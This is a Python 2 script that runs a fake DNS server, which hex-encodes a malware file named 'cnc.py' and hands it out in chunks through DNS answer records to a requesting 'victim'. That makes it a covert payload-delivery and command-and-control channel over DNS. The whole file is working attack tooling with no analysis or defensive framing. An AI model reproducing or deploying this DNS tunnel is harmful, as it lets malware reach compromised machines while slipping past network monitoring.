import socket
from dnslib import *

UDP_IP   = '127.0.0.1'
UDP_PORT =  53

"""
What's the protocol?

The first request, to malware.domain.com returns the number of 
chunks encoded as an IP address. 

32 0-f chars.domain.com

This encodes 16 bytes
"""

dname = 'domain.com'

BLOCKS_PER_REQUEST = 10
CHARS_PER_BLOCK = 32
CHUNK_SIZE = CHARS_PER_BLOCK * BLOCKS_PER_REQUEST

malware_binary = 'cnc.py'
print 'Serving binary:', malware_binary
evil = open(malware_binary).read().encode('hex')
NUM_CHUNKS = len(evil) / (CHUNK_SIZE) + 1

if len(evil) % CHARS_PER_BLOCK != 0:
    evil += ( CHARS_PER_BLOCK - (len(evil)%CHARS_PER_BLOCK) )*'0'

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
sock.bind((UDP_IP, UDP_PORT))

def serve(sock, addr, data):
    query = DNSRecord.parse(data)
    
    reply = DNSRecord(DNSHeader(id=query.header.id, qr=1, aa=1, ra=1), q=query.q)
    reply.add_answer(RR(rname=query.q.qname, rtype=QTYPE.A, rclass=CLASS.IN, ttl=5, rdata=A("10.10.%d.%d" % (NUM_CHUNKS/(1<<8),NUM_CHUNKS%(1<<8)))))
    
    #print "Received %s from %s" % (query, addr)
    sock.sendto(reply.pack(), addr)
    
    while 1:
        data, addr = sock.recvfrom(1024)
        query = DNSRecord.parse(data)
        #print "Received request %s" % query.q.qname
        
        req = str(query.q.qname)
        req_prefix = req[:req.find('.')]
        if req_prefix == 'stop':
            break
        
        chunk_index = int(req_prefix)
        start_loc = chunk_index * CHUNK_SIZE
        
        reply = DNSRecord(DNSHeader(id=query.header.id, qr=1, aa=1, ra=1), q=query.q)
        for i in range(BLOCKS_PER_REQUEST):
            block_loc = start_loc + i*CHARS_PER_BLOCK
            if block_loc >= len(evil):
                break
            elif block_loc + CHARS_PER_BLOCK > len(evil):
                block = evil[block_loc:len(evil)]
            else:
                block = evil[block_loc:block_loc + CHARS_PER_BLOCK]
            
            block_num = chunk_index*BLOCKS_PER_REQUEST + i
            aname = str(block_num) + block + '.' + dname
            #print "Returning block_index: %d chunk_index: %d block_data: %s" % (block_num, chunk_index, block)
            
            reply.add_answer(RR(rname=aname, rtype=QTYPE.A, rclass=CLASS.IN, ttl=5, rdata=A('10.10.10.10')))    
        
        sock.sendto(reply.pack(), addr)

while True:
    data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
    print 'Received request from victim', addr
    serve(sock, addr, data)
    print 'Done. Listening for connections'
